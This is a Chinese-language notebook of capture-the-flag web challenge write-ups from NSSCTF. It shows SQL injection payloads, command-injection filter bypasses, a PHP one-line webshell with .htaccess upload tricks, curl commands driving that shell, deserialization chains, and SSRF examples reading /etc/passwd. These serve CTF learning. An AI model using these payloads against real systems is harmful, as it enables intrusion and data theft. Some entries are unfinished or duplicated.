# 1.[SWPUCTF 2021 新生赛]gift_F12

F12

# 2.[SWPUCTF 2021 新生赛]jicao

playload:

```
GET: /?json{"x":"wllm"}
POST: id=wllmNB
```

# 3.[SWPUCTF 2021 新生赛]easy_md5

观察代码，要求使用GET请求获得name，用POST请求获得password，并且要使得输入的name和password的MD5的值也要相同

如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的，所以只要寻找这样的字符就好了

# 4.[SWPUCTF 2021 新生赛]include

进入环境提示传入一个file，传入/?file=1,显示出源代码，通过阅读源代码

![1742635374226](image/NSS/1742635374226.png)

我们可以看到我们可以通过get方法上传file，并且没有检查过滤，并且file还可以传给include_once函数，此函数的作用会包含我们指定的文件，若文件内容是php代码则会执行

php伪协议：php://filter会对数据流进行过滤和处理

我们要查看flag.php中的flag并且不能让php代码执行，所以要将flag.php中的内容base64编码再读,然后将读到的base64编码还原得到flag

playload：

```
/?file=php://filter/read/convert.base64encode/resource=flag.php
```

# 5:[SWPUCTF 2021 新生赛]easy_sql

学习了一遍数据库的基本操作，由于我的操作系统是arch，所以使用了MariaDB来练习，将MariaDB连接vscode进行练习。

首先F12查看源代码，注释里面表明参数是wllm，先尝试一下 `/?wllm=1`,显示如下

![1742661145810](image/NSS/1742661145810.png)

题目说是sql注入，尝试一下 `/?wllm=1'`,显示报错可以尝试注入

首先判断有多少列

```
/?wllm=1' order by 1 --+
/?wllm=1' order by 2 --+
/?wllm=1' order by 3 --+
/?wllm=1' order by 4 --+
```

当尝试到4时会出现报错，所以得出只有3列

![1742661805219](image/NSS/1742661805219.png)

然后进行查询每行分别是什么

```
/?wllm=-1' union select 1,2,3 --+
```

得到

Your Login name:2
Your Password:3

所以第二列是name，第三列是password

尝试查询所在的数据库名称,database()会返回默认的数据库，然后通过union select 回显出来

```
/?wllm=-1' union select 1, 2, database() --+
```

得到数据库名称test_db

然后查询此数据库中有哪些表

使用group_concat(table_name),是一个聚合函数可以将多行中的table_name列的值连接成为一个字符串以逗号分隔

FROM information_schema.tables

information_schema.tables是 MySQL 的一个系统表，存储了数据库中所有表的元数据信息，包括表名、表类型、创建时间等

WHERE table_schema='test_db'

table_schema这是 `information_schema.tables` 表中的一个列，表示表所属的数据库名称

**`'test_db'`** ：这是你想要查询的数据库名称。这里过滤出属于 `test_db` 数据库的所有表。

```
?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'--+
```

![1742662788002](image/NSS/1742662788002.png)

得到两个表test_tb,users

用类似的方法查询两个表中的字段

```
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db'--+
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='users'--+
```

在test_tb找到flag

![1742664042055](image/NSS/1742664042055.png)

查询test_tb中的flag

```
/?wllm=-1' union select 1, 2, flag from test_tb --+
```

![1742664382585](image/NSS/1742664382585.png)

补充：

# 6.[SWPUCTF 2021 新生赛]easyrce

题目介绍是rce漏洞，rce为远程代码执行漏洞，观察代码可以得到

![1742827765701](image/NSS/1742827765701.png)

是eval函数导致的，eval函数会直接运行代码，所以我们尝试通过输入url参数产看根目录下有什么

```
/?url=system("ls /");
```

通过ls命令我们得到了

![1742828658284](image/NSS/1742828658284.png)

然后通过cat命令查看了flllllaaaaaaggggggg文件，得到flag

```
/?url=system("cat /flllllaaaaaaggggggg");
```

system()
system() 是 PHP 中⽤于执⾏外部程序并显⽰输出的⼀个函数。这个函数接受⼀个字符串
参数，该参数是要执⾏的命令，然后在 Web 服务器上执⾏这个命令。
基本语法：

```
system(string command, int &command, int &return_var);
```

$command : 要执⾏的命令。
&$return_var （可选）：此变量将填充执⾏命令后的返回状态。

需要注意的是，使⽤ system() 或其他⽤于执⾏外部命令的函数时必须⾮常⼩⼼，特别是
当命令中包含⽤户提供的数据时。否则，你的应⽤程序将容易受到命令注⼊攻击。

# 7.[SWPUCTF 2021 新生赛]caidao

观察代码是一个用利用post请求的rce漏洞，eval函数导致的

![1742833451698](image/NSS/1742833451698.png)

所以用post传参得到flag，在hackbar中利用post传参利用rce漏洞

```
wllm=system("ls /");
wllm=system("cat /flag");
```

# 8.[SWPUCTF 2021 新生赛]Do_you_know_http

关于http协议的题

进入环境，需要我们使用WLLM浏览器访问。

![1742885368676](image/NSS/1742885368676.png)

所以使用burp suite抓包，从proxy模块发送到，repeater模块，将User-Agent后内容改为WLLM

```
User-Agent：WLLM
```

然后出现的结果要我们访问a.php

![1742885899242](image/NSS/1742885899242.png)

访问后要求在本地访问这个页面

所以使用相同的方法抓包，修改客户端原始ip地址为127.0.0.1（本地)

```
X-Forwarded-For:127.0.0.1    （这个语句放在第三行左右，放在最后的话好像不起作用）
```

然后出现结果

![1742886200736](image/NSS/1742886200736.png)

访问./secretttt.php得到flag

# 9.[SWPUCTF 2021 新生赛]babyrce

观察代码，可以得到，我们要首先把cookie中admin的值设为1

![1742888419210](image/NSS/1742888419210.png)

使用hackbar或者bp抓包修改

```
Cookie:admin=1
```

![1742888703595](image/NSS/1742888703595.png)

然后访问rasalghul.php

![1742888802242](image/NSS/1742888802242.png)

根据访问后的页面，我们可以使用get请求来修改url的值，但是代码中使用 `preg_match`函数检查 `$ip`中是否包含空格。如果检测到空格，脚本将终止执行并输出 `nonono`

然后$ip中的代码将被shell_exec执行，最后由echo函数打印出来

先看一下有什么东西

```
${IFS}
$IFS$9
可以用来在linux shell中代替空格（后面那个好像$加任何数字都可以）

<
<>
%20
%09
URL编码

cat,flag.php(用逗号当作空格)
```

```
/?url=ls	   （查看当前目录下有什么）
/?url=ls${IFS}/    (查看根目录下有什么)
```

![1742889443578](image/NSS/1742889443578.png)

在根目录下看到了flag，直接拿

```
/?url=cat${IFS}/flllllaaaaaaggggggg
```

得到flag

# 10.[SWPUCTF 2021 新生赛]ez_unserialize

![1743126109221](image/NSS/1743126109221.png)

先查看源代码，看到代码最后面的注释，发现是robots.txt的内容，查看robots.txt

```
/robots.txt
```

![1743126349036](image/NSS/1743126349036.png)

查看/cl45s.php

![1743126450149](image/NSS/1743126450149.png)

终于找到了题目的源代码！（反序列化的题目)

阅读源代码，看到原码中将admin初始化为user，passwd初始化为123456

但是__destruct()函数中需要使得admin=admin,passwd=ctf才能得到flag

看到代码后面可以用get方法输入p，并且传入unserialize()函数

经查询unserialize（)函数是用来进行反序列化的

**序列化（Serialization）** 是将对象转换为字符串的过程，方便存储或传输；**反序列化（Unserialization）** 是将字符串还原为对象。

然后我们尝试构造一个序列化的语句然后传入unserialize（)函数执行

```
/*
$xx = new wllm()
$xx -> admin = "admin"
$xx -> passwd = "ctf"
*/这短代码用在原文

非原文
class wllm()
{
	public $admin = "admin";
	public $passwd = "ctf";
}
$xx = new wllm();
$gw = serialize($xx);
echo $gw;

```

非原文构造

![1743128340166](image/NSS/1743128340166.png)

原代码只需要重新创建一个wllm类然后赋值，进行序列话输出

![1743128452826](image/NSS/1743128452826.png)

ok，现在我们得到了一个序列化后的代码，用get方法传入

```
?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";} 
```

反序列化后对象满足 `__destruct()` 条件，输出flag。

补充！

`__construct()`是原程序的默认赋值操作，但是反序列化生成的对象的属性值直接覆盖了类定义中的默认值（如果有），但实际是**绕过**了构造函数中的赋值逻辑，原程序的赋值操作被跳过了，反序列话优先级高

**__destruct() 的核心特性**

**触发时机**

当对象的生命周期结束时（例如脚本执行完毕）。

当对象被显式销毁（如调用 `unset($obj)`）。

**反序列化场景** ：反序列化生成的临时对象会在脚本结束时触发 `__destruct()`。

**常见用途**

清理资源（如关闭数据库连接、释放文件句柄）。

在反序列化漏洞中，它是触发恶意代码的关键入口。

**与构造函数的对比**

`__construct()`：对象**创建时**调用（反序列化时不会触发）。

`__destruct()`：对象**销毁时**调用（反序列化时会触发）。

# 11.[SWPUCTF 2021 新生赛]easyupload2.0

进入一看这是一个文件上传的题目

![1743132923703](image/NSS/1743132923703.png)

尝试一句话木马(one.php)

```
<?php
@eval($_POST['cmd']);
?>
```

上传失败，提示php是不行的

修改后缀one.phtml                (php3，php5，pht，phtml，phps都是php可运行的文件扩展名)

修改后上传成功

然后想办法getshell

可以使用linux的bash命令行

```

curl -X POST -d "cmd=system("ls");"http://node4.anna.nssctf.cn:28791/upload/one.phtml
发现可以使用木马
curl -X POST -d "cmd=system("pwd")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
curl -X POST -d "cmd=system("ls /")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
curl -X POST -d "cmd=system("pwd")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
curl -X POST -d "cmd=system("ls /app")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
curl -X POST -d "cmd=system("cat /app/flag.php")"http://node4.anna.nssctf.cn:28791/upload/one.phtml"
得到flag
```

或者可以使用python来构造请求

```
import requests

url = "http://node4.anna.nssctf.cn:28791/upload/one.phtml"
data = {"cmd": "system('cat /app/flag.php"}

response = requests.post(url, data=data)

print(response.text)
```

或者可以使用其他的一些工具，例如蚁剑

# 12. [SWPUCTF 2021 新生赛]easyupload1.0

进入网站发现是一个文件上传的页面

尝试上传一句话木马（one1.0.php)

```
<?php
@eval($_POST['cmd']);
?>
```

发现上传失败，尝试使用其他php文件的后缀（php3，phtml)，发现都被过滤了尝试将后缀改为.jpg

发现可以上传但是jpg文件没用，所以在bs上对上传操作进行抓包，并将jpg后缀改为php

![1744038937824](image/NSS/1744038937824.png)

显示上传成功，需要getshell来寻找flag

通过linux的bash命令行来getshell

```
curl -X POST -d "cmd=system('pwd');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
curl -X POST -d "cmd=system('ls /app');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
发现flag.php
curl -X POST -d "cmd=system('cat /app/flag.php');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
cat到flag，但是发现是一个假的flag
curl -X POST -d "cmd=system('env');"http://node7.anna.nssctf.cn:27834/upload/one1.0.php
查看环境变量寻找线索
```

发现flag就在环境变量中

![1744039433271](image/NSS/1744039433271.png)

！注意环境变量中也可以寻找线索

# 13.[SWPUCTF 2021 新生赛]no_wakeup

产看页面代码发现这是一个反序列化的题目

![1744128569591](image/NSS/1744128569591.png)

利用php代码构造出符合要求的代码并输出结果

![1744128684488](image/NSS/1744128684488.png)

得到结果

![1744128728749](image/NSS/1744128728749.png)

尝试利用get方法提交这个结果

```
/?p=O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
发现不可行，源代码中有__weakup（）函数，尝试绕过这个函数，修改属性数量2-->3使得__weakup()函数跳过
/?p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

！！！注：

1. **`__wakeup` 的触发条件** ：
   PHP 在反序列化对象时，正常情况下会先重建对象属性，然后自动调用 `__wakeup` 方法。但这一过程有一个前提： **序列化字符串中声明的属性数量必须与目标类实际定义的属性数量完全一致** 。
2. **属性数量不一致的影响** ：
   如果序列化字符串中声明的属性数量（例如 `O:6:"HaHaHa":3`）多于目标类实际定义的属性数量（假设类 `HaHaHa` 只有 2 个属性），PHP 会认为数据被篡改或版本不兼容，从而触发以下行为：

* **跳过 `__wakeup`** ：为了防止潜在的不安全操作，PHP 会直接跳过 `__wakeup` 的执行。
* **忽略多余属性** ：多余的属性（如第 3 个属性）在反序列化时会被忽略，但对象仍会被创建。

__weakup（）函数的作用：

`__wakeup()` 是 PHP 中的一个魔术方法（Magic Method），它 **在对象反序列化（`unserialize()`）时自动调用** ，主要用于在反序列化后对对象进行初始化或恢复某些状态。以下是其核心作用和应用场景：

### 1. **核心作用**

* **重建对象状态** ：
  序列化（`serialize()`）仅保存对象的属性数据，但不会保存对象的资源（如数据库连接、文件句柄等）或运行时状态。`__wakeup()` 可以在反序列化后重新初始化这些资源或恢复必要状态。
* **数据修复与验证** ：
  如果对象属性在序列化后发生格式变化（例如版本升级），可以通过 `__wakeup()` 对旧数据进行兼容性修复或校验。
* **安全控制** ：
  开发者可以在 `__wakeup()` 中重置敏感权限或清理不安全数据，防止反序列化攻击。

### 2. **触发时机**

* **调用条件** ：
  `__wakeup()` 仅在以下情况下触发：
* 通过 `unserialize()` 反序列化对象时。
* 序列化字符串中声明的属性数量 **严格等于** 类实际定义的属性数量（否则会被跳过，如你提到的绕过场景）。

# 14.[SWPUCTF 2021 新生赛]PseudoProtocols

查看这道题目，发现需要考查php伪协议

进入题目发现

hint is hear Can you find out the hint.php?

要让我们查看hint.php,尝试访问发现可以访问成功但是显示的是空白页面，可能是被屏蔽了

url中貌似提醒我们要尝试用php://filter伪协议进行访问

```
/?wllm=php://filter/read/convert.base64-encode/resource=hint.php
```

![1744338021919](image/NSS/1744338021919.png)

用base64解码查看，发现是

![1744338083944](image/NSS/1744338083944.png)

尝试访问/test2222222222222.php

![1744338149396](image/NSS/1744338149396.png)

发现可以使用get方法上传a并使得a严格=i want flag

有两种方法

```
/?a=data://text/plain,I want flag
```

data://text/plain指定MIME类型为纯文本

或者直接利用命令行来访问

```
curl -X POST -d "I want flag" http://node7.anna.nssctf.cn:29262/test2222222222222.php/?a=php://input
```

`php://input`是一个只读流，用于读取原始的请求数据。它通常用于接收POST请求的内容，尤其是在处理非文件上传的POST数据时。

得到flag

![1744339157025](image/NSS/1744339157025.png)

# 15.[NCTF 2018]签到题

bp抓包

![1744340740346](image/NSS/1744340740346.png)

添加cookie并修改url得到flag

在url中删除secret.php

![1744340810230](image/NSS/1744340810230.png)

# 16.[SWPUCTF 2021 新生赛]hardrce

题目是一个无字母RCE绕过，前面做过rce漏洞的题目，通过eval函数构造执行就可以了，但是此题目会屏蔽某些特殊符号和大小写字母

![1744646734590](image/NSS/1744646734590.png)

不论如何先尝试一下,发现被过滤了

```
/?wllm=system('pwd');
```

可以通过异或，取反来绕过（~可以进行取反，然后通过urlencode函数变成url编码)

```
<?php
$a=urlencode(~'system');
$c=urlencode(~'ls /');
$b=urlencode(~'cat /flllllaaaaaaggggggg');
echo $a;
echo $c;
echo $b;
//echo '(~'.$a.')'.'(~'.$b.')';
?>
```

![1744647836426](image/NSS/1744647836426.png)

尝试使用（再次通过~来取反恢复为原来的密码)

```
(~%8F%9C%9E...)(~%9C%9E...)
// 等价于：
('system')('cat /flag');
```

括号在此处有两个关键作用：

1. **包裹函数名** ：`(~%8F%9C%9E...)` 会被优先计算，结果作为函数名。
2. **包裹参数** ：`(~%9C%9E...)` 会被计算为字符串参数。

```
/?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

得到，发现了flag

![1744648061063](image/NSS/1744648061063.png)

尝试获取flag内容

```
/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98)
```

得到flag

# ![1744648291412](image/NSS/1744648291412.png)17[第五空间 2021]签到题

![1744767765925](image/NSS/1744767765925.png)

直接替换为NSSCTF{}提交就可

# 18.[陇剑杯 2021]签到

分析附件发现很多http协议报文，还有很多403响应，根据题目要填写NSSCTF{http}

# 19. [广东强网杯 2021 个人决赛]签到题

下载附件解压后就可以得到flag

# 20.[陇剑杯 2021]jwt（问1）

下载附件用wireshark打开，分析->追踪流->http

![1744906108164](image/NSS/1744906108164.png)

查找/identity，发现cookie，用base64解码知道是jwt认证方式，由三部分组成，用点（.）分隔

（/identity” 通常是一个 HTTP 请求路径，用于与身份（identity）相关的操作）

# 21.[长城杯 2021 院校组]签到

得到一串十六进制数5a6d78685a3374585a57786a6232316c5833527658324e6f5957356e5932686c626d64695a544639

尝试转换为ASCII码，然后base64解码得到flag

![1744907156457](image/NSS/1744907156457.png)

# 22.[SWPUCTF 2022 新生赛]ez_ez_php

题目的标签中含有php伪协议，文件包含等，进入题目环境，查看代码

![1744942486078](image/NSS/1744942486078.png)

substr（）函数要求传入get请求的代码前三位必须是php，所以我们想到利用php伪协议来构造

```
/?file=php://filter/read/convert.base64-encode/resource=flag.php
```

![1744942907266](image/NSS/1744942907266.png)

进入发现有base64编码，进行解码后得到

![1744942960069](image/NSS/1744942960069.png)

发现flag在flag文件里，不再flag.php

```
/?file=php://filter/read/convert.base64-encode/resource=flag
```

得到flag（base64解码后）

![1744943086440](image/NSS/1744943086440.png)

# 23.[SWPUCTF 2021 新生赛]error

使用sqlmap先做完题（再学习一遍sql查询的命令！！！！！！！！！！)

# 24.[陇剑杯 2021]webshell（问1）

题目要求用wireshark进行流量分析，然后找到黑客登录用的密码

对流量包看下来，登入系统一般都有一下的特征：
x1.登入成功说明状态码为200
x2.用post方式登入
x3.一般进入的是login页面

用字符串过滤login，发现有这样的流量

![1744946435911](image/NSS/1744946435911.png)

进行追踪http流，发现password

![1744946524921](image/NSS/1744946524921.png)

进行url解码后得到 `Admin123!@#`

flag为NSSCTF{`Admin123!@#`}

# 25.[SWPU 2019]神奇的二维码

下载附件，是一个二维码扫描后发现是一个假的flag

![1744957722104](image/NSS/1744957722104.png)

然后用binwalk扫描图片，发现还有几个rar压缩包

```
binwalk  '/home/kali/Desktop/MISC-神奇的二维码-BitcoinPay.png'
```

![1744957915197](image/NSS/1744957915197.png)

然后将扫描到的文件提取出来

```
binwalk -e '/home/kali/Desktop/MISC-神奇的二维码-BitcoinPay.png'
```

![1744958010041](image/NSS/1744958010041.png)

解压压缩包，然后发现有两个压缩包需要密码

![1744958513079](image/NSS/1744958513079.png)

![1744959251125](image/NSS/1744959251125.png)

密码在flag.doc里面，然后进行连续20次base64解码，得到密码（里面是一个音频）

![1744958535026](image/NSS/1744958535026.png)

密码在encode.txt里面，base64解码可得（里面是一个表情包)

![1744959230434](image/NSS/1744959230434.png)

播放得到的音频发现是摩斯密码，用Audacity打开mp3音频，得到可视化的

![1744958867719](image/NSS/1744958867719.png)

粗的为-

细的为.

手动对照摩斯密码表译码后得到

![1744958972260](image/NSS/1744958972260.png)

```
NSSCTF{morseisveryveryeasy}
```

# 26.[SWPUCTF 2021 新生赛]easyupload3.0

这是一个文件上传问题，首先尝试上传一句话木马，发现被阻止了。

尝试修改后缀上传，先上传1.jpg文件然后用bp抓包修改为1.php等各类php后缀上传，都不可行。

改变思考方式.htaccess文件设置为以下代码，使得让上传的1.jpg文件解析为php代码并执行

```
<FilesMatch "1.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

```
注：.htaccess 是 Apache 服务器中一个重要的配置文件，用于对网站目录进行 个性化配置 。它允许用户在无需修改主服务器配置文件的情况下，针对特定目录（及其子目录）设置规则
```

上传.htaccess文件的时候由于我的系统为archlinux，此文件以.开头会被隐藏，所以用bp抓包修改文件名(刚开始可以用xxx.txt这样的文件名)，使得上传成功

![1745335196584](image/NSS/1745335196584.png)

然后在bash中利用一句话木马

```
curl -X POST -d "cmd=system('cat /app/flag.php');" http://node7.anna.ns
sctf.cn:21624/upload/1.jpg
```

![1745335818568](image/NSS/1745335818568.png)

得到flag

# 27.[SWPUCTF 2021 新生赛]pop

查看源代码，发现是一个反序列化的题目

![1745377994509](image/NSS/1745377994509.png)

让我们尝试来理解题目的代码逻辑：

题目要求我们调用w44m类中的Getflag（）函数并且使得

$admin=w44m

$passwd=08067

时得到flag

w22m类中有一个 `$w00m`属性，并且还有一个魔术方法__desturt(),当对象被销毁时会自动调用。在这个方法里，它会尝试输出 `$w00m` 的值

w33m类中有一个 `$w00m`属性和 `$w22m`属性，还有一个魔术方法__toString(),当对象被当作字符串使用时会自动调用。在这个方法里，它会调用 `$w00m` 对象中名为 `$w22m` 的方法

通过编写序列化代码来尝试解决

```
<?php

class w44m
{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m
{
    public $w00m;
}

class w33m
{
    public $w00m;
    public $w22m;
}

$w44m = new w44m();
$w22m = new w22m(); 
$w33m = new w33m();

$w33m->w00m = $w44m;
$w33m->w22m = 'Getflag';
$w22m->w00m = $w33m;


$playload = serialize($w22m);
echo urlencode($playload);
?>
```

然后尝试简化一点的代码逻辑,要获取flag，需要构造一个特定的反序列化载荷，利用PHP对象注入触发方法调用链，使得最终执行 `w44m::Getflag()(要求admin=w44m，passwd=08067，利用反序列化修改w44m的私有属性admin和受保护属性passwd)`

w22m的__destruct方法会输出w00m属性

w33m的__toString方法会调用w00m属性的方法（方法名由w22m属性指定)

构造利用链，创建w22m对象，其w00m属性为w33m对象，w33m对象的w00m属性指向修改后的w44m实例，w22m属性设为‘Getflag’

先进行

# **28.[SWPUCTF 2021 新生赛]finalrce**


| 方面           | `exec()`                                           | `eval()`                                              |
| -------------- | -------------------------------------------------- | ----------------------------------------------------- |
| **用途**       | 用于执行外部系统命令（如操作系统命令）。           | 用于执行 PHP 代码字符串。                             |
| **执行机制**   | 在操作系统层面执行命令。                           | 在 PHP 解释器层面执行代码。                           |
| **安全性风险** | 可能导致命令注入攻击。                             | 可能导致代码注入攻击。                                |
| **返回值**     | 默认返回命令输出的最后一行，可选参数获取完整输出。 | 返回执行的 PHP 代码的结果，通常是最后一个表达式的值。 |
| **应用场景**   | 系统管理、与其他程序交互等。                       | 动态生成和执行 PHP 代码。                             |

![1746755937950](image/NSS/1746755937950.png)

查看代码，发现有关键字的过滤

仔细一看发现没有过滤whoami,然后睡5秒再回应，尝试一下，发现返回 can you see anything?

```
/?url=whoami;sleep 5
```

尝试一下简单过滤,并将结果保存到网站的/1.txt文件里

```
/?url=l''s / | tee 1.txt
```

访问1.txt发现

![1746758880700](image/NSS/1746758880700.png)

由于cat被过滤，我们可以用tac命令
/?url=tac /a_here_is_a_f1ag | tee 2.txt
发现提示我们在fllllllaaaaaggggg里
所以尝试获取，发现la是被过滤了

尝试绕过用flllll\aaaaaaggggggg
/?url=tac /flllll\aaaaaaggggggg | tee 3.txt
访问得到flag

由于cat被过滤，我们可以用tac命令

```
/?url=tac /a_here_is_a_f1ag | tee 2.txt
```

发现提示我们在fllllllaaaaaggggg里

所以尝试获取，发现la是被过滤了

尝试绕过用flllll\aaaaaaggggggg

```
/?url=tac /flllll\aaaaaaggggggg | tee 3.txt
```

访问得到flag

![1746759199899](image/NSS/1746759199899.png)

# 29.[LitCTF 2023]我Flag呢？

直接查看CTRL+U查看源代码

![1758867255946](images/NSS/1758867255946.png)

# 30.[NSSCTF 2022 Spring Recruit]ezgame

这是一个js分析题目有两种做法:

1.可以直接F12在代码中找到flag

![1758868773158](images/NSS/1758868773158.png)

2.发现通关要求是超过65分

![1758868813175](images/NSS/1758868813175.png)

那就在控制台将分数改为超过65分,然后重新开一局就可以得到flag

![1758868850414](images/NSS/1758868850414.png)![1758868886961](images/NSS/1758868886961.png)

# 31:[NISACTF 2022]easyssrf

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){          // 大小写不敏感过滤
    die("你败了.");
}
// flag in /flag
echo file_get_contents($file);        // 触发 SSRF/伪协议读取
?>
//这是这类题目的原始代码,还可以在此基础上变体
```

本题是这样的

![1758870596174](images/NSS/1758870596174.png)

尝试获取一下flag

```url
file:///flag
```

提示我需要查看/fl4g

```url
file:///fl4g
```

提示查看ha1x1ux1u.php

访问后看到源码,果然是一类题目

![1758873385013](images/NSS/1758873385013.png)

接着使用,得到flag

```url
?file=/flag
```

注:

```study
file_get_contents($file)//读取文件内容的内置函数，功能简洁且常用，主要作用是将整个文件（或网络资源）的内容读取为一个字符串
```


| 目标            | 绕过思路         | 实际 payload                                                           |
| --------------- | ---------------- | ---------------------------------------------------------------------- |
| 直接读`/flag`   | 不用 file 关键字 | `?file=/flag`                                                          |
| 伪协议读`/flag` | 避开 file 字母   | `?file=php://filter/read=convert.base64-encode/resource=/flag`         |
| 目录穿越读 flag | 没过滤 ../       | `?file=../../../../flag`                                               |
| 读当前源码      | 伪协议 + base64  | `?file=php://filter/read=convert.base64-encode/resource=ha1x1ux1u.php` |

ssrf可以做

1. 读本地文件 `file:///etc/passwd`
2. 扫内网端口 `http://192.168.1.x:22`
3. 打内网服务 `gopher://127.0.0.1:6379/...`

# 32.[BJDCTF 2020]easy\_md5

查看题目只有一个输入框

![1758875210831](images/NSS/1758875210831.png)

随意输入一个东西然后查看F12,发现响应表头中有hint->提示

![1758875445237](images/NSS/1758875445237.png)

MySQL 中 `md5($pass, true)` 会返回 **二进制形式** 的 MD5 哈希值（而非默认的十六进制字符串）。如果这个二进制值中包含 `'`（单引号）等特殊字符，可能会闭合 SQL 语句中的引号，导致 SQL 注入。

### 具体利用方式：

我们需要找到一个字符串 `$pass`，使得它的 MD5 二进制哈希值包含 `'or'` 这样的序列，从而让原查询变成恒真条件。

例如，若 `md5($pass, true)` 的结果为 `'or'xxx`（xxx 为其他字符），则原查询会被解析为：

```sql
select * from admin where password=' 'or'xxx'
```

此时 `'or'` 会使条件恒真（因为 `'or'` 两边只要有一个为真则整体为真），无需正确密码即可查询到 `admin` 表的数据。

### 已知有效 payload：

字符串 `ffifdyop`(万能密码)

输入万能密码后

![1758875925712](images/NSS/1758875925712.png)

然后查看页面源代码

![1758876323789](images/NSS/1758876323789.png)

发现是php的弱比较("==")

可以找两个科学计数法为0e开头的,比如``

a=QNKCDZO&b=s878926199a

a=240610708&b=314282422

```url
?a=QNKCDZO&&b=s878926199a//成功绕过跳转到level114.php
```

![1758877284277](images/NSS/1758877284277.png)

发现是强比较("===")

给 `param1` 和 `param2` 各传一个**数组**，`md5()` 遇到数组会返回 `NULL`，于是
`md5($param1) === md5($param2)` 变成 `NULL === NULL`，成立；``
而两个数组本身不相等，`$param1 !== $param2` 也成立，条件全满足，直接出 flag。

![1758878624852](images/NSS/1758878624852.png)

# 33.[第五空间 2021]WebFTP

打开页面发现是一个登录页面

先试试扫描网站目录吧

```bash
dirsearch -u http://node7.anna.nssctf.cn:29107/?m=login
```

![1761117090961](images/NSS/1761117090961.png)

发现有phpinfo界面,访问进入,然后搜索flag,找到flag

![1761117178677](images/NSS/1761117178677.png)

仔细找找的话会发现密码在README.md里面

但是登录进入里面好像也没有flag

# 34.[GXYCTF 2019]Ping Ping Ping

![1761118278646](images/NSS/1761118278646.png)

进入发现是一个搜索框,然后随便输个内容,发现上面输入的参数是ip,

尝试输入127.0.0.1,发现可以ping通

然后尝试

```
127.0.0.1;ls
```

发现有一个flag.php和index.php

尝试看一眼内容

```base
127.0.0.1;cat index.php
```

发现失败了

![1761118531636](images/NSS/1761118531636.png)

好像对空格进行了过滤

`127.0.0.1;cat${IFS}index.php`

发现对大括号进行了过滤

`127.0.0.1;cat$IFSIFS$1index.php`

成功发现过滤规则

![1761119272233](images/NSS/1761119272233.png)

对查询flag有过滤,尝试进行变量替换

`127.0.0.1;q=g;cat$IFS$9fla$q.php`

然后ctrl+u查看源代码,发现

![1761120014020](images/NSS/1761120014020.png)

# 35.[ZJCTF 2019]NiZhuanSiWei

打开环境看到题目

![1761547768222](images/NSS/1761547768222.png)

第一层过滤要求

`if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`

isset()函数是确保参数存在,也就是确保参数非空

在这就是确保isset($text)中的参数

$text不为空

其次要求`file_get_contents($text)`的返回值**严格等于**字符串`"welcome to the zjctf"`

直接使用 `welcome to the zjctf` 作为 `$text` 的值

如果我们将 `$text` 设为 `welcome to the zjctf`（即 URL 参数为 `?text=welcome to the zjctf`），此时 `file_get_contents($text)` 会把 `$text` 的值当作**文件路径**，尝试读取服务器上名为 `welcome to the zjctf` 的文件。

但实际上，服务器上几乎不可能存在这个名字的文件（文件名包含空格且内容刚好是自身），因此 `file_get_contents` 会返回 `false` 或报错，无法满足 `file_get_contents($text) === "welcome to the zjctf"` 的条件，导致无法进入后续逻辑。

使用 `data://text/plain,welcome to the zjctf` 作为 `$text` 的值

`data://` 是 PHP 支持的一种**伪协议**，用于直接传递数据（而非读取实际文件）。其格式为 `data://[MIME类型],[数据内容]`。

在这里，`data://text/plain,welcome to the zjctf` 的含义是：

* `text/plain` 表示数据的 MIME 类型为纯文本；
* 逗号后面的 `welcome to the zjctf` 是实际要传递的数据。

当 `file_get_contents` 处理这个伪协议时，会直接读取逗号后面的字符串，而不是去访问服务器上的文件。因此 `file_get_contents($text)` 的返回值就是 `welcome to the zjctf`，刚好满足代码中的判断条件 `file_get_contents($text) === "welcome to the zjctf"`，从而通过第一层验证。

第二次过滤要求

`if(preg_match("/flag/",$file)){ echo "Not now!"; exit(); }`

preg_match()函数,PHP 的正则匹配函数，成功返回 **1**，失败返回 **0**，错误返回 **false**。

* 正则模式`/flag/`：
  * 前后的`/`是正则表达式的定界符，中间的`flag`是匹配的核心内容（纯文本）。
  * 含义：匹配**任何包含 “flag” 子字符串**的内容（不限制位置，比如 “flag.php”“aflag”“flag123” 都会被匹配）。
  * 注意：这里没有加`i`修饰符（如`/flag/i`），所以只严格匹配小写的 “flag”（大写 “FLAG” 不会被匹配，但实际场景中 flag 相关文件通常用小写命名）。

`include($file); //useless.php`

* `include($file)`：PHP 的`include`函数会将`$file`对应的文件内容当作 PHP 代码加载并执行。例如，如果`$file`是`useless.php`，就会加载该文件中的所有代码（类定义、函数等）。
* 注释`//useless.php`是关键提示：题目暗示`useless.php`是合法且需要被包含的文件（因为它不包含`flag`关键词，能通过前面的`preg_match`过滤）。
* 为什么需要包含这个文件？
  因为后续的`unserialize($password)`需要依赖类的定义（PHP 反序列化时，必须先加载被反序列化对象所属的类，否则会报错 “Class not found”）。因此`useless.php`中一定定义了某个关键类。

